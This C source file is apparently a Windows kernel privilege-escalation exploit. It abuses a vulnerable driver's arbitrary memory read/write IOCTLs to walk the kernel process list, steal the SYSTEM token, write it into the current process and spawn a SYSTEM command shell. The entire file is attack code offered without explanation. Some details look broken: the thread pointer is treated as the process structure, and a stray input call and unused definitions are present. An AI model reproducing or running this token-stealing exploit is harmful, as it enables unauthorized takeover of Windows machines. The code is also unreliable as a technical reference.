#include <windows.h>
#include <stdio.h>
#include <psapi.h>

#define IOCTL_VULN_CODE_READ  0x22200B  // arbitrary memory read
#define IOCTL_VULN_CODE_WRITE 0x22200C  // arbitrary memory write

#define IOCTL_READ_BYTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x800, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IOCTL_WRITE_BYTE CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)

// Define EPROCESS structure offsets
#define EPROCESS_TOKEN_OFFSET 0x4b8     // Token offset in EPROCESS
#define EPROCESS_PID_OFFSET   0x440     // PID offset in EPROCESS
#define SYSTEM_PID 4                    // SYSTEM process has PID 4

// Structure for read/write using the driver
typedef struct _RW_OPERATION {
    PVOID address;  // Address to read/write
    PVOID buffer;   // Buffer to store the data (for read) or data to write (for write)
    SIZE_T size;    // Size of the data to read/write
} RW_OPERATION;

HANDLE open_driver_handle()
{
    HANDLE hDevice = CreateFile(L"\\\\.\\VulnerableDriver", GENERIC_READ | GENERIC_WRITE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (hDevice == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open handle to the driver. Error code: %lu\n", GetLastError());
        return NULL;
    }
    printf("[+] Successfully opened handle to the driver\n");
    return hDevice;
}

BOOL read_kernel_memory(HANDLE hDevice, PVOID address, PVOID buffer, SIZE_T size)
{
    RW_OPERATION rwOp = { address, buffer, size };
    DWORD bytesReturned;
    return DeviceIoControl(hDevice, IOCTL_VULN_CODE_READ, &rwOp, sizeof(rwOp), NULL, 0, &bytesReturned, NULL);
}

BOOL write_kernel_memory(HANDLE hDevice, PVOID address, PVOID buffer, SIZE_T size)
{
    RW_OPERATION rwOp = { address, buffer, size };
    DWORD bytesReturned;
    return DeviceIoControl(hDevice, IOCTL_VULN_CODE_WRITE, &rwOp, sizeof(rwOp), NULL, 0, &bytesReturned, NULL);
}

PVOID get_current_process_eprocess()
{
    return (PVOID)__readgsqword(0x188);
}

PVOID get_system_token(HANDLE hDevice)
{
    scanf_s("%*c");
    PVOID currentEPROCESS = get_current_process_eprocess();
    PVOID systemEPROCESS = NULL;
    ULONG_PTR systemToken = 0;

    ULONG_PTR currentPID = 0;
    read_kernel_memory(hDevice, (PVOID)((ULONG_PTR)currentEPROCESS + EPROCESS_PID_OFFSET), &currentPID, sizeof(ULONG_PTR));

    PVOID processListEntry = (PVOID)((ULONG_PTR)currentEPROCESS + 0x2f0); 
    PVOID nextProcess = processListEntry;

    do {
        ULONG_PTR pid = 0;
        PVOID nextEPROCESS = (PVOID)((ULONG_PTR)nextProcess - 0x2f0);

        read_kernel_memory(hDevice, (PVOID)((ULONG_PTR)nextEPROCESS + EPROCESS_PID_OFFSET), &pid, sizeof(ULONG_PTR));

        if (pid == SYSTEM_PID) {
            systemEPROCESS = nextEPROCESS;
            break;
        }

        // Move to the next process in the active process list
        read_kernel_memory(hDevice, (PVOID)((ULONG_PTR)nextProcess), &nextProcess, sizeof(PVOID));

    } while (nextProcess != processListEntry);

    if (systemEPROCESS) {
        read_kernel_memory(hDevice, (PVOID)((ULONG_PTR)systemEPROCESS + EPROCESS_TOKEN_OFFSET), &systemToken, sizeof(ULONG_PTR));
        systemToken &= ~0xF;  // Clear the lower 4 bits (TOKEN value has some flags)
        return (PVOID)systemToken;
    }
    else {
        printf("[-] Failed to locate SYSTEM EPROCESS\n");
        return NULL;
    }
}

BOOL set_system_token(HANDLE hDevice, PVOID systemToken)
{
    PVOID currentEPROCESS = get_current_process_eprocess();
    return write_kernel_memory(hDevice, (PVOID)((ULONG_PTR)currentEPROCESS + EPROCESS_TOKEN_OFFSET), &systemToken, sizeof(ULONG_PTR));
}

int main()
{
    HANDLE hDevice = open_driver_handle();
    if (!hDevice) {
        return -1;
    }

    // Get the SYSTEM token via arbitrary read
    PVOID systemToken = get_system_token(hDevice);
    if (!systemToken) {
        CloseHandle(hDevice);
        return -1;
    }

    // Replace current process token with SYSTEM token via arbitrary write
    if (!set_system_token(hDevice, systemToken)) {
        printf("[-] Failed to set SYSTEM token\n");
        CloseHandle(hDevice);
        return -1;
    }

    printf("[+] Successfully set SYSTEM token for current process\n");

    // Spawn a SYSTEM cmd.exe
    printf("[+] Spawning SYSTEM cmd.exe\n");
    system("cmd.exe");

    CloseHandle(hDevice);
    return 0;
}
